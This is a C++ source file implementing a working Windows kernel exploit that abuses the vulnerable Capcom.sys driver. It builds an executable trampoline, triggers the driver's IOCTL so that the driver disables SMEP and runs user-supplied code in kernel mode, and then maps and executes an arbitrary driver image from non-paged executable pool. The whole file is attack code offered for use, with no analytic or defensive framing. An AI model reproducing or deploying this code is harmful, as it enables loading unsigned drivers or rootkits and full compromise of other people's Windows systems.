#pragma once
#include "stdafx.h"
#include "CapcomDriver.h"
#include "../KernelHelp.h"

DECLARE_UNICODE_STRING(strAllocPoolWithTag, L"ExAllocatePoolWithTag");

PVOID CapcomDriver::PayloadImage;
SIZE_T CapcomDriver::PayloadSize;
DWORD CapcomDriver::PayloadEntryRVA;
void(__stdcall *CapcomDriver::PayloadEntry)(PVOID DriverObject, PVOID RegistryEntry);

PVOID NTAPI CapcomDriver::LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
{
	// Allocate executable unpaged memory for driver
	PVOID drvmap = K_GetRoutine(ExAllocatePoolWithTag)(NonPagedPoolExecute, PayloadSize, '\0kdD');
	if (drvmap)
	{
		// Nice intrinsic trick from https://github.com/Professor-plum/Reflective-Driver-Loader/blob/master/Hadouken/Hadouken.c
		__movsq((PDWORD64)drvmap, (PDWORD64)PayloadImage, (SIZE_T)(PayloadSize / sizeof(INT64)));

		PayloadEntry = MakePointer<decltype(PayloadEntry)>(drvmap, PayloadEntryRVA);
		PayloadEntry(NULL, NULL);
	}
	return nullptr;
}

bool CapcomDriver::EnsureValidTarget()
{
	// TODO: Add OS checks
	return true;
}

bool CapcomDriver::EnsureDriverLoaded()
{
	m_CapcomHandle = Util::Win32::unique_handle
	{
		CreateFile(CAPCOM_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)
	};

	return m_CapcomHandle.get() != INVALID_HANDLE_VALUE;
}

void CapcomDriver::Exploit()
{
	Util::Debug::Print("CapcomDriver::Exploit()\n", PayloadImage);

	Options.Image->MapForKernel();

	PayloadImage = Options.Image->GetMappedBase();
	PayloadSize = Options.Image->GetMappedSize();
	PayloadEntryRVA = Options.Image->GetEntryPointRVA();

	Util::Debug::Print("Mapped Capcom.sys to: %p\n", PayloadImage);
	Util::Debug::Print("EntryPointRVA: %p\n", PayloadEntryRVA);
}

const std::wstring & CapcomDriver::GetVulnDriverName()
{
	return m_DriverName;
}

PPAYLOADTRAMP CapcomDriver::AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// Allocate executable page for payload
	m_Payload = Util::Win32::unique_virtalloc<TRAMPPAGE>
	{
		reinterpret_cast<PTRAMPPAGE>
		(
			VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
		)
	};

	if (!m_Payload.get()) Util::Exception::ThrowLastError("VirtualAlloc");

	m_Payload->TrampAddr = &m_Payload->TrampData;

	// sti; jmp qword [PayloadAddr]
	m_Payload->TrampData = {
		{ 0xFB, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00 }, // sti; jmp qword [rip+7]
		targetFunc,
	};

	return &m_Payload->TrampData;
}

void CapcomDriver::ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// For passing to DeviceIoControl. The driver doesn't do anything with these.
	DWORD dummyOutBuf, dummyBytesReturned;

	// VirtualAlloc a trampoline payload
	PPAYLOADTRAMP payload = AllocPayloadTrampoline(targetFunc);

	// Trigger the payload by sending the address of the payload as InBuf. The driver will then disable SMEP and then execute our payload trampoline
	// which will jump to the function specified during the creation of the payload.
	auto bRes = DeviceIoControl(m_CapcomHandle.get(), CAPCOM_DEVICE_IOCTL64, reinterpret_cast<LPVOID>(&payload), 8, &dummyOutBuf, 4, &dummyBytesReturned, nullptr);
	if (!bRes) Util::Exception::ThrowLastError(L"DeviceIoControl");
}

